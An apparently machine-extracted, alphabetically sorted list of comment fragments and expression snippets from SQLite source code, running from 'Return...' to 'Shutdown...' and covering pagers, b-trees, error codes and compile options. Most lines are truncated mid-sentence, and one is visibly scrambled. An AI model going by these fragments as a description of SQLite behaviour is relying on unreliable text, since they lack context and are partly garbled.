 Return the major token number for the symbol popped.
 Return the maximum amount of memory that has ever been
 Return the maximum height of any expression tree referenced
 Return the most recent error code generated by an SQLite routine. If NULL is
 Return the mutex associated with a database connection.
 Return the name of a wildcard parameter.  Return NULL if the index
 Return the name of the Nth column of the result set returned by SQL
 Return the name of the database from which a result column derives.
 Return the name of the table column from which a result column derives.
 Return the name of the table from which a result column derives.
 Return the number of bytes actually written into buf[].  The number
 Return the number of bytes allocated for the expression structure
 Return the number of bytes in the sqlite3_value object assuming
 Return the number of bytes of space at the end of every page that
 Return the number of bytes read.  The value is stored in 
 Return the number of bytes required to create a duplicate of the
 Return the number of bytes required to store a JournalFile that uses vfs
 Return the number of bytes required to store a MemJournal that uses vfs
 Return the number of bytes that will be needed to store the given
 Return the number of bytes written.
 Return the number of changes in the most recent call to sqlite3_exec().
 Return the number of changes since the database handle was opened.
 Return the number of columns in the result set for the statement pStmt.
 Return the number of columns in the result set returned by the
 Return the number of elements evaluated.
 Return the number of errors seen.
 Return the number of indices on the table.
 Return the number of pages in the specified database.
 Return the number of pages still to be backed up as of the most recent
 Return the number of references to the page supplied as an argument.
 Return the number of references to the pager.
 Return the number of references to the specified page.
 Return the number of rows inserted. If this routine is
 Return the number of rows that were changed. If this routine is
 Return the number of rows that were deleted. If this routine is
 Return the number of times the Step function of a aggregate has been
 Return the number of values available from the current row of the
 Return the number of wildcards that can be potentially bound to.
 Return the number of write-cursors open on this handle. This is for use
 Return the offset of the sector boundary at or immediately
 Return the page in this parameter 
 Return the page number for page pPg.
 Return the pager associated with a BTree.  This routine is used for
 Return the pathname of the journal file for this database. The return
 Return the peak depth of the stack for a parser.
 Return the register where results are stored.
 Return the sector size in bytes of the underlying block device for
 Return the serial-type for the value stored in pMem.
 Return the size in bytes of a PCache object.
 Return the size in bytes of a PCache object.  Used to preallocate
 Return the size of a BtCursor object in bytes.
 Return the size of a memory allocation previously obtained from
 Return the size of an allocation 
 Return the size of the database file in pages. If there is any kind of
 Return the sqlite3
 Return the total number of outstanding page references 
 Return the total number of pages in the cache.
 Return the total number of pages in the database file associated
 Return the total number of pages in the source database as of the most
 Return the total number of pages stored in the cache 
 Return the total number of referenced pages held by the cache.
 Return the type of the argument.
 Return the value of a status counter for a prepared statement
 Return the value of the 'auto-vacuum' property. If auto-vacuum is
 Return the value of the iSize parameter specified when Bitvec 
 Return true if an opcode has any of the OPFLG_xxx properties
 Return true if any register in the range iFrom..iTo (inclusive)
 Return true if fsync() calls are disabled for this pager.  Return FALSE
 Return true if it is necessary to write page 
 Return true if the Mem object contains a TEXT or BLOB that is
 Return true if the buffer z[0..n-1] contains all spaces.
 Return true if the current thread holds the database connection
 Return true if the file-handle passed as an argument is
 Return true if the floating point value is Not a Number (NaN).
 Return true if the given BtCursor is valid.  A valid cursor is one
 Return true if the page is already in the journal file.
 Return true if this is an in-memory pager.
 Return true if we are able to the IN operator optimization on a
 Return value 
 Return value from subprocedures 
 Returns the number of values in the current row of the result set.
 Returns the size in bytes of the BLOB accessible via the 
 Reverse unordered SELECTs 
 Right and left size of LIKE operator 
 Right key 
 Right operand 
 Right outer join 
 Right subnode 
 Right subtree (larger entries) or list 
 Right table being joined 
 Right-most select in a compound select statement 
 Rollback a transaction
 Rollback all changes. The database falls back to PAGER_SHARED mode.
 Rollback all database files.
 Rollback any active transaction and free the handle structure.
 Rollback or commit any schema changes that occurred. 
 Rollback the transaction in progress.  All cursors will be
 Root BTree node for this table (see note above) 
 Root of the input tree 
 Root of the new tree 
 Root page number of the table to be locked 
 Root page of b-tree 
 Root page of index 
 Root page of scanned b-tree 
 Root page of table 
 Root page of table to open 
 Rootpage of table being initialized 
 Round down to the nearest multiple of 8
 Round up a number to the next larger multiple of 8.  This is used
 Round up a request size to the next valid allocation size.
 Round up request size to allocation size 
 Rounding works like BSD when the constant 0.4999 is used.  Wierd! 
 Routine for en/decoding data 
 Routine needed to support the testcase() macro.
 Routine sqlite3AlterFinishAddColumn() will be called to complete
 Routines to implement min() and max() aggregate functions.
 Routines to implement the count() aggregate function.
 Routines to read and write variable-length integers.  These used to
 Routines used to attach values to wildcards in a compiled SQL statement.
 RowSetTest are such that the rowid of the current row is inserted
 Rowid IN (LIST): cost is NlogN where N is the number of list
 Rowid IN (SELECT): cost is NlogN where N is the number of rows
 Rowid for the inserted record 
 Rowid in sqlite_sequence 
 Rowid stored in register P3 
 Rowid== is always the best pick.  Look no further.  Because only
 Rows are coming out in undetermined order.  We have to push
 Rows come from source in GR BY' clause thanROUP BY order 
 Rowset of rows to be updated 
 Run a test against a Bitvec object of size.  The program argument
 Run the OP_MakeRecord instruction if true 
 Run the parser and code generator recursively in order to generate
 Run the parser on the given SQL string.  The parser structure is
 Run the program 
 Run time limits are intended for use in applications that manage
 SAFE_APPEND property. Because in this case it is not possible
 SAVEPOINT 
 SAVEPOINT_RELEASE==1 
 SAVEPOINT_ROLLBACK==2 )
 SELECT 
 SELECT ... FROM (SELECT ... LIMIT a OFFSET b) LIMIT x OFFSET y
 SELECT a AS b FROM t1 WHERE b
 SELECT c1 
 SELECT may not be DISTINCT 
 SELECT may not be a compound query 
 SELECT may not have a GROUP BY clause 
 SELECT may not have a LIMIT clause 
 SELECT may not have a WHERE clause 
 SELECT may not have an ORDER BY clause 
 SELECT might also skip this part if it has no ORDER BY clause and
 SELECT result into registers dest.iMem...dest.iMem
 SELECT rowid ... 
 SELECT rowid FROM x ... (dup of pSrc) 
 SELECT statement in which to make substitutions 
 SELECT statement that the subquery encodes.  The pTable and
 SELECT statement to encode 
 SELECT statement.
 SELECT statement.  The SELECT statement must be expanded before
 SELECT statements that omit the ORDER BY clause.  This will help
 SELECT statements to the left always skip this part.  The right-most
 SELECT statements.
 SELECT statment or RHS of INSERT INTO .. SELECT ... 
 SELECT statment.
 SELECT to the right of IN operator 
 SELECT used to determine types and collations 
 SET 
 SET clause for UPDATE.  VALUES clause for INSERT 
 SF_Aggregate ) != 0
 SF_Aggregate ) != 0 )
 SF_Aggregate ) ) != 0
 SF_Aggregate ) ) != 0 )
 SF_Aggregate ) ) == SF_Aggregate )
 SF_Aggregate ) ) == SF_Distinct )
 SF_Aggregate ) == 0 )
 SF_Distinct )
 SF_Distinct ) != 0
 SF_Distinct ) != 0 
 SF_Distinct ) != 0 )
 SF_Distinct : 0 )
 SF_Expanded ) != 0 )
 SF_Expanded ) == 0 )
 SF_HasTypeInfo ) != 0 ) return
 SF_HasTypeInfo ) == 0 )
 SF_Resolved ) != 0 )
 SF_Resolved ) == 0 )
 SF_UsesEphemeral ) != 0 )
 SHARED:    Any number of processes may hold a SHARED lock simultaneously.
 SHARED_SIZE is the number of bytes available in the pool from which
 SHARED_SIZE){
 SMALLEST primitives.
 SQL error or missing database 
 SQL function context] that is the first parameter
 SQL function is used.  A function implementation with a non-negative
 SQL function that use this routine so that the functions will exist
 SQL is translated into a sequence of instructions to be
 SQL name of the function. 
 SQL queries for evaluation by a database.  But the application does
 SQL statement using [sqlite3_finalize()] after it has finished with it.
 SQL statement.
 SQL statements 
 SQL statements are passed in as the second parameter to sqlite3_exec().
 SQL statements is a no-op and has no effect on SQL statements
 SQL statements on [database connection] D complete.  Any new SQL statements
 SQL statements without having to write a lot of C code.  The UTF-8 encoded
 SQL statements.
 SQL text used to create a [prepared statement] if that statement was
 SQL to be evaluated 
 SQLITE_ABORT       
 SQLITE_AFF_INTEGER
 SQLITE_AFF_INTEGER 
 SQLITE_AFF_INTEGER is returned.
 SQLITE_AFF_INTEGER:
 SQLITE_AFF_MASK )
 SQLITE_AFF_MASK ) != SQLITE_AFF_NONE )
 SQLITE_AFF_NONE
 SQLITE_AFF_NONE    
 SQLITE_AFF_NONE:
 SQLITE_AFF_NUMERIC 
 SQLITE_AFF_NUMERIC is returned.
 SQLITE_AFF_NUMERIC:
 SQLITE_AFF_REAL
 SQLITE_AFF_REAL    
 SQLITE_AFF_REAL:
 SQLITE_AFF_TEXT
 SQLITE_AFF_TEXT    
 SQLITE_AFF_TEXT:
 SQLITE_ALTER_TABLE 
 SQLITE_AMALGAMATION 
 SQLITE_AUTH        
 SQLITE_BLOB : SQLITE_TEXT )
 SQLITE_BLOB.
 SQLITE_BUSY        
 SQLITE_BUSY error code.
 SQLITE_BUSY immediately.
 SQLITE_BUSY is returned and no data is written to the database file.
 SQLITE_BUSY is returned if the database is locked.  SQLITE_NOMEM
 SQLITE_BUSY.  The sqlite3_mutex_try() interface returns SQLITE_OK
 SQLITE_BUSY. {H17025}  The sqlite3_mutex_try() interface returns [SQLITE_OK]
 SQLITE_CANTOPEN    
 SQLITE_CHECK_PAGES 
 SQLITE_CONFIG_MEMSTATUS are available by default or not. This value can
 SQLITE_CONSTRAINT  
 SQLITE_CONSTRAINT error.  We cannot allow two or more BtShared
 SQLITE_CORE 
 SQLITE_CORE macros is undefined.
 SQLITE_CORRUPT     
 SQLITE_CORRUPT or some other error (i.e. SQLITE_FULL). Check that this
 SQLITE_CORRUPT.  Note that a return of SQLITE_OK does not
 SQLITE_CORRUPT_BKPT()
 SQLITE_COVERAGE_TEST
 SQLITE_COVERAGE_TEST 
 SQLITE_CountRows ) != 0 
 SQLITE_CountRows ) != 0 )
 SQLITE_DEBUG
 SQLITE_DEBUG 
 SQLITE_DEFAULT_SECTOR_SIZE : bytesPerSector
 SQLITE_EMPTY       
 SQLITE_EMPTY is only returned when attempting to open the table
 SQLITE_ENABLE_CEROD
 SQLITE_ENABLE_COLUMN_METADATA
 SQLITE_ENABLE_COLUMN_METADATA 
 SQLITE_ENABLE_EXPENSIVE_ASSERT 
 SQLITE_ENABLE_IOTRACE
 SQLITE_ENABLE_IOTRACE 
 SQLITE_ENABLE_LOCKING_STYLE 
 SQLITE_ENABLE_MEMORY_MANAGEMENT 
 SQLITE_ENABLE_MEMSYS5
 SQLITE_ERROR       
 SQLITE_ERROR : SQLITE_DONE
 SQLITE_FCNTL_DB_UNCHANGED file-control method to disable the
 SQLITE_FORMAT      
 SQLITE_FULL        
 SQLITE_FUNC_CASE )
 SQLITE_FUNC_CASE ) : SQLITE_FUNC_LIKE )
 SQLITE_FUNC_CASE ) == 0
 SQLITE_FUNC_COUNT ) == 0 ) return null
 SQLITE_FUNC_EPHEM ) != 0 )
 SQLITE_FUNC_EPHEM flag.
 SQLITE_FUNC_LIKE ) == 0 )
 SQLITE_FUNC_NEEDCOLL ) != 0 
 SQLITE_FUNC_NEEDCOLL ) != 0 )
 SQLITE_FullColNames ) != 0
 SQLITE_FullFSync ) != 0 ) 
 SQLITE_HAS_CODEC
 SQLITE_HAS_CODEC 
 SQLITE_HAVE_ISNAN 
 SQLITE_INTERNAL    
 SQLITE_INTERRUPT   
 SQLITE_IOCAP_SAFE_APPEND )
 SQLITE_IOCAP_SAFE_APPEND ) != 0
 SQLITE_IOCAP_SAFE_APPEND ) )
 SQLITE_IOCAP_SEQUENTIAL )
 SQLITE_IOCAP_SEQUENTIAL ) )
 SQLITE_IOERR       
 SQLITE_IOERR.  Or the implementation might recognize that a database
 SQLITE_IOERR_XXX] error code
 SQLITE_IOERR_XXX] extended error code.
 SQLITE_IgnoreChecks
 SQLITE_IgnoreChecks ) == 0 )
 SQLITE_InTrans ) == 0 
 SQLITE_InternChanges )
 SQLITE_InternChanges ) != 0 )
 SQLITE_JUMPIFNULL )
 SQLITE_JUMPIFNULL ) != 0 )
 SQLITE_LITTLEENDIAN macros.
 SQLITE_LOCKED      
 SQLITE_LOCKED : SQLITE_SCHEMA
 SQLITE_LOCKED.
 SQLITE_LegacyFileFmt ) != 0 
 SQLITE_LoadExtension
 SQLITE_LoadExtension ) == 0 )
 SQLITE_MAGIC_RUN to SQLITE_MAGIC_HALT.  It is harmless to
 SQLITE_MASTER table.  We just need to update that slot with all
 SQLITE_MAX_ATTACHED>30
 SQLITE_MAX_EXPR_DEPTH //SQLITE_MAX_EXPR_DEPTH>0
 SQLITE_MAX_EXPR_DEPTH>0 
 SQLITE_MAX_FUNCTION_ARG>1000
 SQLITE_MAX_U32 ) != v64 )
 SQLITE_MAX_U32 ) == (u64)nCellKey )
 SQLITE_MAX_U32 ) == (u64)payloadSize64 )
 SQLITE_MAX_U32 is a u64 constant that is the maximum u64 value
 SQLITE_MAX_XYZ].
 SQLITE_MEMORY_SIZE=<i>NNN</i> C preprocessor macro (where <i>NNN</i>
 SQLITE_MISMATCH    
 SQLITE_MISUSE      
 SQLITE_MISUSE immediately.
 SQLITE_MUTEX_RECURSIVE can be entered multiple times by the same thread.
 SQLITE_MUTEX_RECURSIVE.
 SQLITE_MUTEX_W32 
 SQLITE_NOLFS       
 SQLITE_NOMEM       
 SQLITE_NOMEM :
 SQLITE_NOMEM : SQLITE_OK
 SQLITE_NOMEM if a malloc fails while setting a bit in a savepoint
 SQLITE_NOMEM is returned.
 SQLITE_NOMEM may be returned if a malloc() fails during conversion
 SQLITE_NOMEM.
 SQLITE_NOMEM. In this case Vdbe.aOp and Vdbe.nOpAlloc remain
 SQLITE_NOMEM. The next call to _step() (if any) will return SQLITE_ERROR
 SQLITE_NOTADB      
 SQLITE_NOTFOUND    
 SQLITE_NULL != sqlite3_value_type( argv[0] ) ) 
 SQLITE_NULL == sqlite3_value_type( argv[0] ) )
 SQLITE_NoReadlock ) != 0 )
 SQLITE_NullCallback ) != 0 ) ) )
 SQLITE_OK          
 SQLITE_OK != ( rc = subjournalPage( pPg ) )
 SQLITE_OK : SQLITE_IOERR
 SQLITE_OK : SQLITE_IOERR_DELETE
 SQLITE_OK : SQLITE_NOMEM
 SQLITE_OK : SQLITE_NOMEM )
 SQLITE_OK : SQLITE_NOMEM)
 SQLITE_OK : p.rc
 SQLITE_OK : rc)
 SQLITE_OK == ( rc = sqlite3BtreeCommitPhaseTwo( p.pDest ) )
 SQLITE_OK == ( rc = sqlite3PagerSync( pDestPager ) )
 SQLITE_OK == ( rc = sqlite3PagerWrite( pDestPg ) )
 SQLITE_OK == (rc = lockBtree(pBt))) 
 SQLITE_OK if all xSync operations are successful.
 SQLITE_OK if the lock may be obtained (by calling
 SQLITE_OK is returned if everything goes according to plan.
 SQLITE_OK is returned if no error occurs. If an error occurs during
 SQLITE_OK is returned if the conversion is successful (or not required).
 SQLITE_OK is returned if the lock is added successfully. SQLITE_NOMEM
 SQLITE_OK is returned if the operation is successfully executed.
 SQLITE_OK is returned on success.  Any other return value indicates
 SQLITE_OK is returned on success.  If the file is not a
 SQLITE_OK is returned.
 SQLITE_OK is returned. If execution of the statement failed then an
 SQLITE_OK is returned. Otherwise an SQLite error code.
 SQLITE_OK returned. If an IO error occurs while trying to make the
 SQLITE_OK so p is not used.
 SQLITE_OMIT_ANALYZE 
 SQLITE_OMIT_ATTACH 
 SQLITE_OMIT_AUTHORIZATION 
 SQLITE_OMIT_AUTOINCREMENT 
 SQLITE_OMIT_BETWEEN_OPTIMIZATION 
 SQLITE_OMIT_BTREECOUNT 
 SQLITE_OMIT_BUILTIN_TEST 
 SQLITE_OMIT_CAST 
 SQLITE_OMIT_COMPLETE 
 SQLITE_OMIT_COMPOUND_SELECT 
 SQLITE_OMIT_DECLTYPE 
 SQLITE_OMIT_DISKIO 
 SQLITE_OMIT_EXPLAIN 
 SQLITE_OMIT_FLAG_PRAGMAS 
 SQLITE_OMIT_FLOATING_POINT 
 SQLITE_OMIT_GET_TABLE 
 SQLITE_OMIT_INCRBLOB 
 SQLITE_OMIT_INTEGRITY_CHECK 
 SQLITE_OMIT_LIKE_OPTIMIZATION 
 SQLITE_OMIT_LOAD_EXTENSION 
 SQLITE_OMIT_LOCALTIME 
 SQLITE_OMIT_MEMORYDB 
 SQLITE_OMIT_MUTEX 
 SQLITE_OMIT_OR_OPTIMIZATION 
 SQLITE_OMIT_PAGER_PRAGMAS 
 SQLITE_OMIT_PRAGMA
 SQLITE_OMIT_QUICKBALANCE 
 SQLITE_OMIT_SCHEMA_PRAGMAS 
 SQLITE_OMIT_SCHEMA_VERSION_PRAGMAS 
 SQLITE_OMIT_SHARED_CACHE 
 SQLITE_OMIT_SUBQUERY 
 SQLITE_OMIT_TRACE 
 SQLITE_OMIT_TRIGGER 
 SQLITE_OMIT_TRUNCATE_OPTIMIZATION 
 SQLITE_OMIT_UTF16 
 SQLITE_OMIT_VACUUM 
 SQLITE_OMIT_VACUUM macro.
 SQLITE_OMIT_VIEW 
 SQLITE_OMIT_VIRTUALTABLE 
 SQLITE_OMIT_WSD 
 SQLITE_OMIT_XFER_OPT 
 SQLITE_OPEN_CREATE 
 SQLITE_OPEN_CREATE ) != 0 )
 SQLITE_OPEN_DELETEONCLOSE
 SQLITE_OPEN_DELETEONCLOSE ) != 0 )
 SQLITE_OPEN_EXCLUSIVE ) 
 SQLITE_OPEN_EXCLUSIVE ) != 0 )
 SQLITE_OPEN_EXCLUSIVE is used to make sure that a new file is
 SQLITE_OPEN_FULLMUTEX ) != 0 )
 SQLITE_OPEN_MAIN_DB ) != 0 
 SQLITE_OPEN_MAIN_JOURNAL
 SQLITE_OPEN_MAIN_JOURNAL )
 SQLITE_OPEN_MASTER_JOURNAL )
 SQLITE_OPEN_NOMUTEX ) != 0 )
 SQLITE_OPEN_READONLY ) 
 SQLITE_OPEN_READONLY ) != 0
 SQLITE_OPEN_READONLY ) != 0 )
 SQLITE_OPEN_READWRITE ) != 0 )
 SQLITE_OPEN_TEMP_DB
 SQLITE_OPEN_TEMP_JOURNAL ) :
 SQLITE_OS_WIN 
 SQLITE_OS_WINCE 
 SQLITE_PAGER_PRAGMAS 
 SQLITE_PERM        
 SQLITE_PRINT_BUF_SIZE to be less than 350.
 SQLITE_PROTOCOL    
 SQLITE_RANGE       
 SQLITE_READONLY    
 SQLITE_ROW.
 SQLITE_ReadUncommitted )
 SQLITE_ReadUncommitted)
 SQLITE_ReadUncommitted))
 SQLITE_RecoveryMode ) != 0 )
 SQLITE_RecoveryMode ) == 0 )
 SQLITE_ReverseOrder ) != 0 )
 SQLITE_SCHEMA      
 SQLITE_SO_ASC or SQLITE_SO_DESC 
 SQLITE_STATUS_...].
 SQLITE_STOREP2 ) != 0 )
 SQLITE_SYNC_DATAONLY : 0 )
 SQLITE_SYNC_FULL ) != 0 )
 SQLITE_SYNC_FULL : SQLITE_SYNC_NORMAL
 SQLITE_SYSTEM_MALLOC 
 SQLITE_ShortColNames ) != 0
 SQLITE_ShortColNames ) == 0
 SQLITE_SqlTrace ) != 0 )
 SQLITE_TEMP_FILE_PREFIX 
 SQLITE_TEMP_STORE > 3 )
 SQLITE_TEMP_STORE>3
 SQLITE_TEST
 SQLITE_TEST 
 SQLITE_TEST // Testing and debugging use only 
 SQLITE_TESTCTRL_ASSERT shows that assert() is disabled and the second
 SQLITE_TESTCTRL_ASSERT shows that assert() is enabled.
 SQLITE_TEXT.
 SQLITE_THREADSAFE
 SQLITE_THREADSAFE=1 then mutexes are enabled by default but
 SQLITE_TOOBIG      
 SQLITE_TRANSIENT : SQLITE_DYNAMIC )
 SQLITE_TRANSIENT value means that the content will likely change in
 SQLITE_UPDATE : SQLITE_INSERT )
 SQLITE_UTF16BE : SQLITE_UTF16LE )
 SQLITE_UTF16BE == 3 )
 SQLITE_UTF16LE == 2 
 SQLITE_UTF16NATIVE 
 SQLITE_UTF16NATIVE macro. SQLITE_UTF16 is not used internally.
 SQLITE_UTF16_ALIGNED ) != 0 
 SQLITE_UTF16_ALIGNED ) )
 SQLITE_UTF8 : enc )
 SQLITE_UTF8.
 SQLITE_VdbeListing ) != 0 
 SQLITE_VdbeTrace ) != 0 
 SQLITE_WriteSchema ) == 0
 SQLITE_ZERO_MALLOC 
 SQLITE_ZERO_MALLOC is defined.  The allocation drivers implemented
 SQLite assumes that next time the page is retrieved from the cache
 SQLite automatically frees the allocated buffer when the aggregate
 SQLite can be compiled with or without mutexes.  When
 SQLite checks if there are any currently executing SELECT statements
 SQLite code assumes this function cannot fail. It also assumes that
 SQLite connection to register module with 
 SQLite contains a high-quality pseudo-random number generator (PRNG) used to
 SQLite database header may be found using the following formula:
 SQLite database in order to identify the file as a real database.
 SQLite database.
 SQLite each time a query is executed to ensure that the internal cache
 SQLite for parsing.  These routines return 1 if the input string
 SQLite goes to [sqlite3_malloc()] for the additional storage space.
 SQLite implements this interface by calling the xSleep()
 SQLite includes typedefs for 64-bit signed and unsigned integers.
 SQLite interfaces so that an application usually does not need to
 SQLite is free to call the destructor and drop metadata on any
 SQLite library.  The sqlite3_shutdown() routine
 SQLite makes a best effort to honor the soft heap limit.
 SQLite may choose a larger value. This constant is the maximum value
 SQLite might also add one of the following flags to the xOpen method:
 SQLite never tries to read past the end of a rollback journal file 
 SQLite no longer uses thread-specific data so this routine is now a
 SQLite only considers US-ASCII (or EBCDIC) characters.  We do not
 SQLite processes all times and dates as Julian Day numbers.  The
 SQLite provides these two interfaces for reporting on the status
 SQLite supports many different ways to resolve a constraint
 SQLite tables) that are identified by the name of the virtual table.
 SQLite takes the text result from the application from
 SQLite used to check if the root-page flags were sane at this point
 SQLite uses dynamic run-time typing.  So just because a column
 SQLite uses one of these integer values as the second
 SQLite uses the sqlite3_value object to represent all values
 SQLite uses the string pointed to by the
 SQLite version 3.5.9 and 3.6.0 and yet the iVersion field was not
 SQLite will allow '$' in identifiers for compatibility.
 SQLite will also add one of the following flags to the xOpen()
 SQLite will always allocate at least mxPathname
 SQLite will choose on its own.
 SQLite will guarantee that the zFilename parameter to xOpen
 SQLite will use the memory provided by the first argument to satisfy its
 SQLite will use the standard C-library malloc/realloc/free interface
 SQLite's versions are identical to the standard versions assuming a
 SQLite.  But as long as you do not compile with SQLITE_OMIT_AUTOINIT
 SRT_Output.  This routine is never called with any other
 SUM might return an integer if it never encounters a floating point
 SUMMARY:
 Same as READ_UTF8() above but without the zTerm parameter.
 Sanity checking on calling parameters 
 Sanity checking on the page.  This is more important that I originally
 Sanity checking:  The schema for the trigger and for the table are
 Save profiling information from this VDBE run.
 Save the current Vdbe context such that it can be restored by a ContextPop
 Save the current cursor position in the variables BtCursor.nKey
 Save the current state of the PRNG.
 Save the current value of the write-schema flag before setting it. 
 Save the positions of all cursors except pExcept open on the table
 Save the positions of any other cursors open on this table before
 Save the positions of any other cursors open on this table.
 Saved key that was cursor's last known position 
 Saved value of db->lookaside.bEnabled 
 Saved value of db.nChange 
 Saved value of db.nTotalChange 
 Saved value of p.iLimit 
 Saved value of p.iOffset 
 Saved value of the db.flags 
 Saved values of p.nLimit and p.nOffset 
 Savepoint name (nul-terminated) 
 Scan in reverse order 
 Scan the column type name zType (length nType) and return the
 Scan the header and use it to fill in the aType[] and aOffset[]
 Scan the names of the columns of the table to be indexed and
 Scan through the expression pExpr.  Replace every reference to
 Schema containing the table 
 Schema containing the trigger 
 Schema containing this index 
 Schema format version for this file 
 Schema of database iDb 
 Schema of the expression 
 Schema that contains this table 
 Schema.db variable is set to NULL. After the first virtual table
 Scratch buffers are used as part of the btree balance operation.  If
 Scratch memory 
 Search TEMP before MAIN 
 Search a FuncDefHash for a function with the given name.  Return
 Search expressions in ths list 
 Search for a table and column that appears on one side or the
 Search for the index that has the least amount of columns. If
 Search the WHERE clause terms for a usable WO_OR term. 
 Search the freelist looking for a free slot big enough to satisfy
 Search the hash table for an existing entry. 
 Second parameter (often the jump destination) 
 Second part of index name. May be NULL 
 Second part of the name of the table or view 
 Second set of flags.  EP2_... 
 Second sorted list to be merged 
 Second table 
 Seconds 
 Sector size 
 Sector size of the device file is on 
 Sector-size field of journal header 
 See Also:  [SQLite Shared-Cache Mode]
 See Also: [Using the SQLite Online Backup API]
 See Also: [Using the SQLite Unlock Notification Feature].
 See [sqlite3_pcache_methods] for additional information.
 See above 
 See also OpenRead.
 See also OpenWrite.
 See also sqlite3LocateTable().
 See also sqlite3PagerGet().  The difference between this routine
 See also sqlite3PagerLookup().  Both this routine and Lookup() attempt
 See also the [sqlite3_changes()] interface and the
 See also the [sqlite3_commit_hook()] and [sqlite3_rollback_hook()]
 See also the [sqlite3_total_changes()] interface and the
 See also the [sqlite3_update_hook()] interface.
 See also ticket 
 See also:  [sqlite3_collation_needed()] and [sqlite3_collation_needed16()].
 See also: AggStep and AggFinal
 See also: Clear
 See also: CreateIndex
 See also: Destroy
 See also: Prev
 See also: [SQLITE_FCNTL_LOCKSTATE]
 See also: [SQLITE_IOERR_READ 
 See also: [sqlite3_bind_blob
 See also: [sqlite3_blob_read()].
 See also: [sqlite3_blob_write()].
 See also: [sqlite3_db_status()]
 See also: [sqlite3_libversion()] and [sqlite3_libversion_number()].
 See also: [sqlite3_mutex_held()] and [sqlite3_mutex_notheld()].
 See also: [sqlite3_status()] and [sqlite3_db_status()].
 See also: [sqlite3_status()] and [sqlite3_stmt_status()].
 See also: allocateCursor().
 See below 
 See comment in sqlite3.h (sqlite.h.in) for details.
 See comments above 
 See documentation on OP_CreateTable for additional information.
 See http://msdn.microsoft.com/en-us/library/a442x3ye(VS.80).aspx.
 See if the checksum matches the master journal name 
 See note about index shifting on OP_ReadCookie 
 See sqlite3ResolveExprNames() for a description of the kinds of
 See the Lt opcode for additional information.
 See the [threading mode] documentation for additional information.
 See the [threading mode] documentation for additional information.</dd>
 See the mkopcodec.awk script for details. 
 See the mkopcodeh.awk script for details 
 See the sqlite3BitvecBuiltinTest() for additional information.
 See the xferOptimization() function for the implementation of this
 See ticket 
 Seek the index cursor to the start of the range. 
 Select a master journal file name 
 Select the column is extracted from 
 Selects no more than one row 
 Send the data to the callback function or to a subroutine.  In the
 Separate file holding temporary table 
 Separate the left and the right query from one another
 Sequence counter 
 Serial type of the rowid 
 Serial type to deserialize 
 Set 
 Set P4 of the most recently inserted opcode to a column affinity
 Set Pager.journalHdr to -1 for the benefit of the pager_playback()
 Set a flag in the vdbe to update the change counter when it is finalised
 Set a flag on this cursor to cache the locations of pages from the
 Set a flag that indicates we're the first to create the memory so it
 Set after incrementing the change-counter 
 Set all the parameters in the compiled SQL statement to NULL.
 Set and get the suggested cache-size for the specified pager-cache.
 Set bit pgno of the BtShared.pHasContent bitvec. This is called
 Set default precision 
 Set flags on the built-in collating sequences 
 Set it.
 Set len to the maximum number of bytes required in the output buffer. 
 Set nByte to the number of bytes required to store the expanded blob. 
 Set nDestTruncate to the final number of pages in the destination
 Set nNewSize to the size allocated for the structure pointed to
 Set of characters to trim 
 Set of pages in this savepoint 
 Set of pages moved to free-list this transaction 
 Set of table index masks 
 Set or clear the access authorization function.
 Set or retrieve the codec for this pager
 Set pFile.locktype to this value before exiting 
 Set pPg to 0 and jump to the exception handler.  
 Set pSize to the number of bytes of data in the entry the
 Set pSize to the size of the buffer needed to hold the value of
 Set the BtLock.eLock variable to the maximum of the current lock
 Set the EP_FromJoin property on all terms of the given expression.
 Set the Expr.nHeight variable in the structure passed as an
 Set the Expr.nHeight variable using the exprSetHeight() function. If
 Set the ExprList.a[].zName element of the most recently added item
 Set the ExprList.a[].zSpan element of the most recently added item
 Set the LIKEOPT flag on the 2-argument function with the given name.
 Set the VdbeCursor.isTable and isIndex variables. Previous versions of
 Set the aConstraint[].usable fields and initialize all
 Set the abort flag and return 
 Set the bit number pgno in the PagerSavepoint.pInSavepoint
 Set the busy handler function.
 Set the cached rowid value of every cursor in the same database file
 Set the collating sequence for expression pExpr to be the collating
 Set the collation function of the most recently parsed table column
 Set the current transaction state to TRANS_NONE and unlock the
 Set the database size back to the value it was before the savepoint
 Set the doNotSync flag to 1. This is because we cannot allow a journal
 Set the error code of the destination database handle. 
 Set the error count to three.
 Set the foreign key value to NULL 
 Set the foreign key value to its default 
 Set the i-th bit.  Return 0 on success and an error code if
 Set the limiter.
 Set the magic to VDBE_MAGIC_RUN sooner rather than later. 
 Set the maximum error count 
 Set the maximum page count for a database if mxPage is positive.
 Set the most recent error code and error string for the sqlite
 Set the nReserve size to N for the main database on the database
 Set the name of the idx'th column to be returned by the SQL statement.
 Set the new 'max-root-page' value in the database header. This
 Set the number of output columns
 Set the number of result columns that will be returned by this SQL
 Set the output variable and return SQLITE_OK 
 Set the output variable to NULL in case an error occurs. 
 Set the permutation used by the OP_Compare operator to be the array
 Set the pointer-map entry for the new sibling page. 
 Set the right-child pointer of pParent to point to the new page. 
 Set the soft heap-size limit for the library. Passing a zero or
 Set the suggested cache-size value.
 Set the time to the current time reported by the VFS
 Set the value of a status to X.
 Set the value of register P1 to the maximum of its current value
 Set the value of the Pager.sectorSize variable for the given
 Set this global variable to 1 to enable tracing using the TRACE
 Set to 1 if ORDER BY is DESC 
 Set to 1 when TABLE matches 
 Set to true if a 'special' error 
 Set to true if constraints may cause a replace 
 Set to update db->lastRowid 
 Set to update db->nChange 
 Set up a SrcList containing just the table being scanned by this loop. 
 Set up a raw page so that it looks like a database page holding
 Set up an sqlite3_backup object. sqlite3_backup.pDestDb must be set
 Set up the local name-context to pass to sqlite3ResolveExprNames() to
 Set up the lookaside buffers for a database connection.
 Set useTempTable to TRUE if the result of the SELECT statement
 Set when dbSize is correct 
 Set zIn to point at the start of the input buffer and zTerm to point 1
 SetEndOfFile will fail if nByte is negative 
 Setting NDEBUG makes the code smaller and run faster.  So the following
 Setting the auth function to NULL disables this hook.  The default
 Setting the size limit to -1 means no limit is enforced.
 Setting to a null string reverts to the default temporary directory search.
 Several VAULT_ELEMENT_TYPES are currently unimplemented according to
 Sharable content of this Btree 
 Shared b-tree handle 
 Shared cache is disabled by default. But this might change in
 Shared memory segment used for locking 
 Shared part of btree structure 
 Shared-cache locks are released when a database connection concludes
 Shift the integer value in register P2 to the left by the
 Shift the integer value in register P2 to the right by the
 Shifts all join operators from left to right for an entire FROM
 Shifts left before out of the error 
 Shortened table list 
 Should >=0 for apSub element. 
 Show full column names on SELECT 
 Show short columns names 
 Shutdown the mutex system. This call frees resources allocated by
